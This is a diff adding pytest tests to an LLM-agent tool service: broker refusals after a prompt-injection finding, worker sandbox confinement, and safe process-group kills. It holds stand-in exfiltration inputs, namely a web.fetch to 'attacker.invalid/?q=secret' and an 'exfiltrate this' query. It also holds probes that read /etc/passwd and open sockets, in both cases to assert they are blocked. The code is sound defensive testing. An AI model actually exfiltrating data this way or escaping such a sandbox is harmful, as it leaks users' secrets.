@@ -23,16 +23,18 @@ from __future__ import annotations
 
 import asyncio
 import json
+import multiprocessing
 import os
 import subprocess
 import sys
 import threading
 import time
 import uuid
+from contextlib import contextmanager
 
 import pytest
 
-from liminallm.service import agent_tools, interpreter, web
+from liminallm.service import agent_tools, interpreter, tool_worker, web
 from liminallm.service.broker import CapabilityBroker, InvocationContext
 from liminallm.service.invocation import (
     COMMITTED,
@@ -287,17 +289,38 @@ class TestARevokedInvocationLaunchesNoSandboxChild:
         finally:
             invocation.close()
 
-    def test_a_live_invocation_owns_the_child_it_starts(self, runtime, caller):
-        """The registry is what makes the tree reachable at all.
+    def test_a_live_invocation_owns_the_child_it_starts(
+        self, runtime, caller, monkeypatch
+    ):
+        """Registered while it runs, released once it is reaped.
 
         A sandbox child is the *parent's* child, not the worker's, so killing
-        the worker never reaches it. It has to be registered as it starts.
+        the worker never reaches it: it has to be registered as it starts. And
+        it has to be *un*registered once reaped, because a pid outlives the
+        process only as a number and the kernel reuses numbers — a registration
+        left behind is a standing licence to SIGKILL whoever gets it next,
+        redeemed at teardown.
         """
         from pathlib import Path
 
         engine = runtime.workflow
         invocation = Invocation("owns-its-child", tool="code.python_v1")
         invocation.begin_attempt()
+        registered: list = []
+        released: list = []
+        real_add = invocation.resources.add_child
+        real_forget = invocation.resources.forget_child
+
+        def watched_add(pid, label, **kwargs):
+            registered.append((pid, label))
+            return real_add(pid, label, **kwargs)
+
+        def watched_forget(pid):
+            released.append(pid)
+            return real_forget(pid)
+
+        monkeypatch.setattr(invocation.resources, "add_child", watched_add)
+        monkeypatch.setattr(invocation.resources, "forget_child", watched_forget)
         try:
             with current_invocation(invocation):
                 agent_tools.run_python(
@@ -308,10 +331,15 @@ class TestARevokedInvocationLaunchesNoSandboxChild:
                     session=invocation.session,
                     invocation=invocation,
                 )
-            seen = [child.label for child in invocation.resources.children()]
             workdir = invocation.workdir
             assert workdir, "the scratch was never prepared"
-            assert any("sandbox" in label for label in seen), seen
+            sandbox_pids = [pid for pid, label in registered if "sandbox" in label]
+            assert sandbox_pids, f"the child was never registered: {registered}"
+            assert released == sandbox_pids, (
+                f"registered {sandbox_pids} but released {released}; a reaped "
+                "pid left in the registry is authority over its reuse"
+            )
+            assert invocation.resources.children() == []
         finally:
             invocation.close()
         # Closing the execution is what removes the scratch now: the handler's
@@ -565,6 +593,89 @@ class TestTheOperationLedger:
         assert ledger.replay(1, "web.search", digest) is None
 
 
+class TestWithdrawalIsEnforcedAtTheCapability:
+    """§21.1 says the refusal happens at the capability, and it has to.
+
+    The agent loop reaches `_execute_agent_tool`, which checks taint — but that
+    is the *worker* following the intended protocol. The worker is the
+    untrusted side of this boundary by construction, so a compromised one can
+    skip `tools.round` and ask the broker for `web.fetch` directly. The check
+    has to be where the authority is.
+    """
+
+    def _tainted(self, tool="web.fetch_v1"):
+        invocation = Invocation("tainted", tool=tool)
+        invocation.begin_attempt()
+        invocation.session["injection_findings"] = ["override_attempt"]
+        return invocation
+
+    def test_a_direct_web_fetch_is_refused_after_a_finding(
+        self, runtime, caller, monkeypatch
+    ):
+        engine = runtime.workflow
+        reached: list = []
+        monkeypatch.setattr(
+            web, "fetch_url", lambda url, **kw: reached.append(url) or {}
+        )
+        monkeypatch.setattr(engine.settings, "web_tools_enabled", True, raising=False)
+        invocation = self._tainted()
+        try:
+            reply = _ask(
+                _broker(engine, user_id=caller.id),
+                invocation,
+                "web.fetch",
+                {"url": "http://attacker.invalid/?q=secret"},
+            )
+            assert reached == [], f"a tainted turn fetched {reached}"
+            assert reply["ok"] is True, reply
+            assert "REFUSED" in reply["result"]["text"], reply
+        finally:
+            invocation.close()
+
+    def test_a_direct_web_search_is_refused_after_a_finding(
+        self, runtime, caller, monkeypatch
+    ):
+        engine = runtime.workflow
+        reached: list = []
+        monkeypatch.setattr(web, "search_web", lambda *a, **kw: reached.append(a) or [])
+        monkeypatch.setattr(engine.settings, "web_tools_enabled", True, raising=False)
+        invocation = self._tainted("web.search_v1")
+        try:
+            reply = _ask(
+                _broker(engine, user_id=caller.id),
+                invocation,
+                "web.search",
+                {"query": "exfiltrate this"},
+            )
+            assert reached == [], f"a tainted turn searched {reached}"
+            assert reply["ok"] is True, reply
+            assert "REFUSED" in reply["result"]["text"], reply
+        finally:
+            invocation.close()
+
+    def test_a_direct_python_run_is_refused_after_a_finding(
+        self, runtime, caller, monkeypatch
+    ):
+        engine = runtime.workflow
+        started: list = []
+        monkeypatch.setattr(
+            interpreter, "run_python_sandboxed", lambda *a, **kw: started.append(1)
+        )
+        invocation = self._tainted("code.python_v1")
+        try:
+            reply = _ask(
+                _broker(engine, user_id=caller.id),
+                invocation,
+                "python.run",
+                {"code": "print(1)"},
+            )
+            assert reply["ok"] is True, reply
+            assert "REFUSED" in reply["result"]["text"], reply
+            assert started == [], "a tainted turn started the interpreter"
+        finally:
+            invocation.close()
+
+
 class TestPublicationHappensOnce:
     def test_a_replayed_publish_copies_nothing(self, runtime, caller, tmp_path, monkeypatch):
         """The guard is around the copy, so a retry can tell "the files are
@@ -599,6 +710,43 @@ class TestPublicationHappensOnce:
             invocation.close()
         assert copies == [1], f"the copy happened {len(copies)} times, not once"
         assert dest.joinpath("out.csv").read_text() == "1,2\n"
+
+    def test_the_same_name_over_different_bytes_is_divergence(
+        self, runtime, tmp_path
+    ):
+        """Identity is the bytes, not the filename.
+
+        A retry runs the model's code again. The same code writing
+        `result.csv` from a different branch produces the same *name* over
+        different *content* — and replaying on the name alone would leave
+        attempt one's file in the user's area while attempt two's answer
+        describes what it computed, with nothing reporting the disagreement.
+        """
+        invocation = Invocation("publish-content")
+        invocation.begin_attempt()
+        workdir = tmp_path / "work"
+        workdir.mkdir()
+        dest = tmp_path / "files"
+        created = [{"name": "result.csv", "size": 1}]
+        try:
+            with current_invocation(invocation):
+                (workdir / "result.csv").write_text("bytes A")
+                assert agent_tools._publish(
+                    str(workdir), str(dest), created,
+                    invocation=invocation, operation_seq=1, step="publish",
+                ) == ["result.csv"]
+                # Same position, same filename, different content.
+                (workdir / "result.csv").write_text("bytes B")
+                with pytest.raises(RetryDivergence):
+                    agent_tools._publish(
+                        str(workdir), str(dest), created,
+                        invocation=invocation, operation_seq=1, step="publish",
+                    )
+            # And the user's copy is still the one that was actually committed,
+            # rather than silently claiming to be B.
+            assert dest.joinpath("result.csv").read_text() == "bytes A"
+        finally:
+            invocation.close()
 
     def test_a_diverged_republish_is_refused(self, runtime, tmp_path):
         """A replacement worker that produced different files at the same
@@ -728,6 +876,256 @@ class TestTheRegistryDoesNotGrow:
         first = registry.open("same", tool="t")
         assert registry.open("same", tool="t") is first
         first.close()
+
+
+# ---------------------------------------------------------------------------
+# the worker is contained, and the group kill cannot reach the server
+
+
+def _confined_probe(conn, scratch):
+    """Child body: confine, then report what authority survives. Module-level
+    so `spawn` can pickle it."""
+    import os as _os
+
+    from liminallm.service.tool_worker import _confine
+
+    findings = {}
+    try:
+        _confine(scratch)
+        findings["confined"] = True
+    except BaseException as exc:  # noqa: BLE001
+        conn.send({"confined": False, "why": f"{type(exc).__name__}: {exc}"})
+        conn.close()
+        return
+    findings["env"] = dict(_os.environ)
+    try:
+        with open("/etc/passwd") as handle:
+            handle.read()
+        findings["host_fs"] = True
+    except OSError:
+        findings["host_fs"] = False
+    try:
+        import socket as _socket
+
+        _socket.create_connection(("192.0.2.1", 80), timeout=1).close()
+        findings["network"] = True
+    except OSError:
+        findings["network"] = False
+    conn.send(findings)
+    conn.close()
+
+
+class TestTheWorkerIsActuallyConfined:
+    """The process designated as the untrusted side must not keep ambient
+    host authority.
+
+    `multiprocessing` spawn inherits the service's environment, filesystem view
+    and network namespace, so before this the worker was untrusted in name
+    only: `os.environ["DATABASE_URL"]`, `open("/etc/passwd")` and an outbound
+    socket were all still there. The broker being the *intended* channel is not
+    the broker being the *only* channel.
+
+    This runs the real `_confine` in a real spawned child and asks the kernel,
+    rather than reading the source and believing it.
+    """
+
+    def _probe(self, tmp_path):
+        scratch = tmp_path / "worker-scratch"
+        scratch.mkdir()
+        ctx = multiprocessing.get_context("spawn")
+        parent_conn, child_conn = ctx.Pipe(duplex=True)
+        proc = ctx.Process(
+            target=_confined_probe, args=(child_conn, str(scratch)), daemon=True
+        )
+        proc.start()
+        child_conn.close()
+        assert parent_conn.poll(60), "the probe never reported"
+        findings = parent_conn.recv()
+        proc.join(10)
+        return findings
+
+    def test_the_host_filesystem_environment_and_network_are_gone(self, tmp_path):
+        from liminallm.service.confine import backend_name
+
+        if backend_name() is None:
+            pytest.skip("no confinement backend on this platform")
+        findings = self._probe(tmp_path)
+        assert findings.get("confined") is True, findings
+        assert findings["host_fs"] is False, "the worker could read /etc/passwd"
+        assert findings["network"] is False, "the worker opened a socket"
+        for leaked in ("DATABASE_URL", "JWT_SECRET", "REDIS_URL"):
+            assert leaked not in findings["env"], (
+                f"{leaked} survived into the worker's environment"
+            )
+
+    def test_a_worker_with_no_scratch_runs_nothing(self):
+        """The conditional form of this check would be the defect stated as a
+        default argument, so there is no conditional form."""
+        ctx = multiprocessing.get_context("spawn")
+        parent_conn, child_conn = ctx.Pipe(duplex=True)
+        proc = ctx.Process(
+            target=tool_worker._worker_main,
+            args=(child_conn, "web.fetch_v1", {}, {}, ""),
+            daemon=True,
+        )
+        proc.start()
+        child_conn.close()
+        seen = []
+        while parent_conn.poll(60):
+            seen.append(parent_conn.recv())
+            if seen[-1].get("done"):
+                break
+        proc.join(10)
+        done = [m for m in seen if m.get("done")]
+        assert done, seen
+        assert done[0]["result"]["error"] == "worker_unconfined", done
+        assert not [m for m in seen if m.get("capability")], (
+            "the body reached the broker despite having no boundary"
+        )
+
+    def test_a_refused_rlimit_raises_rather_than_running_uncapped(self, monkeypatch):
+        """SPEC calls these hard caps, and the code used to swallow the
+        refusal while its own comment said it must not."""
+        import resource
+
+        def refuse(which, value):
+            raise OSError(1, "operation not permitted")
+
+        monkeypatch.setattr(resource, "setrlimit", refuse)
+        with pytest.raises(tool_worker.WorkerLimitsUnavailable):
+            tool_worker._apply_limits({"memory_bytes": 512 * 1024 * 1024})
+
+    def test_a_refused_rlimit_stops_the_body(self, monkeypatch, tmp_path):
+        """And the body never reaches its first broker request.
+
+        Run in-process against a stand-in pipe: a spawned child cannot see a
+        monkeypatch, and the property under test is the ordering inside
+        `_worker_main`, not the spawn. A wall-clock kill is not a substitute
+        for an address-space cap — it stops a slow worker, not one that
+        allocates 40GB in a second.
+        """
+        import resource
+
+        sent: list = []
+
+        class _Conn:
+            def send(self, message):
+                sent.append(message)
+
+            def recv(self):  # pragma: no cover - reached only if the body runs
+                raise AssertionError("the body asked the broker for a capability")
+
+            def close(self):
+                pass
+
+        monkeypatch.setattr(tool_worker, "_confine", lambda scratch: None)
+        monkeypatch.setattr(
+            resource,
+            "setrlimit",
+            lambda which, value: (_ for _ in ()).throw(OSError(1, "refused")),
+        )
+        tool_worker._worker_main(
+            _Conn(), "web.fetch_v1", {"inputs": {"url": "http://x.invalid"}},
+            {"memory_bytes": 1024}, str(tmp_path),
+        )
+        done = [m for m in sent if m.get("done")]
+        assert done, sent
+        assert done[0]["result"]["error"] == "worker_unconfined", done
+        assert not [m for m in sent if m.get("capability")], (
+            "the body ran without the caps it is supposed to run under"
+        )
+
+
+class TestTheGroupKillCannotReachTheServer:
+    """`os.setsid()` happens in the child, after `start()` returns.
+
+    Until it has, `os.getpgid(child)` answers with the *parent's* group — so a
+    `killpg` aimed at the worker would SIGKILL the API server and everything
+    sharing its group. Measured, not reasoned about.
+    """
+
+    def test_a_just_started_child_is_still_in_the_parents_group(self):
+        ctx = multiprocessing.get_context("spawn")
+        parent_conn, child_conn = ctx.Pipe(duplex=True)
+        proc = ctx.Process(target=_slow_setsid_child, args=(child_conn,), daemon=True)
+        proc.start()
+        child_conn.close()
+        try:
+            # The window this test exists for: the child has not reached
+            # setsid, so its pgid is ours.
+            assert os.getpgid(proc.pid) == os.getpgid(0), (
+                "the race has closed by itself; the guard below is untested"
+            )
+            # And the kill helper refuses to turn that into a group kill.
+            killed_groups: list = []
+            with _no_killpg(killed_groups):
+                from liminallm.service.invocation import _kill
+
+                _kill(proc.pid, group=True)
+            assert killed_groups == [], (
+                f"killpg was aimed at group {killed_groups}, which is ours"
+            )
+        finally:
+            proc.kill()
+            proc.join(10)
+
+    def test_the_worker_is_registered_by_pid_until_it_proves_its_group(
+        self, runtime, caller, tmp_path
+    ):
+        """The registration is the first line of defence; `_kill` is the
+        second. This is the first."""
+        invocation = Invocation("group-handshake", tool="web.fetch_v1")
+        scratch = tmp_path / "scratch"
+        scratch.mkdir()
+        groups: list = []
+        real_add = invocation.resources.add_child
+
+        def watched(pid, label, **kwargs):
+            groups.append(kwargs.get("group", False))
+            return real_add(pid, label, **kwargs)
+
+        invocation.resources.add_child = watched
+        try:
+            handle = tool_worker.spawn(
+                invocation,
+                "web.fetch_v1",
+                {"inputs": {}},
+                limits={},
+                scratch=str(scratch),
+            )
+            handle.terminate()
+        finally:
+            invocation.close()
+        assert groups, "the worker was never registered"
+        assert groups[0] is False, (
+            "the worker was registered as a group leader before it could "
+            "possibly have called setsid"
+        )
+        # And it was promoted once READY proved the group. On a platform with
+        # no sessions it stays False, which is also correct.
+        assert groups[-1] in (True, False)
+
+
+def _slow_setsid_child(conn):
+    """Blocks before setsid, so the pre-handshake window can be observed."""
+    conn.recv()
+
+
+@contextmanager
+def _no_killpg(recorder):
+    """Record any killpg target instead of signalling it."""
+    from liminallm.service import invocation as invocation_module
+
+    real = invocation_module.os.killpg
+
+    def fake(pgid, sig):
+        recorder.append(pgid)
+
+    invocation_module.os.killpg = fake
+    try:
+        yield
+    finally:
+        invocation_module.os.killpg = real
 
 
 # ---------------------------------------------------------------------------
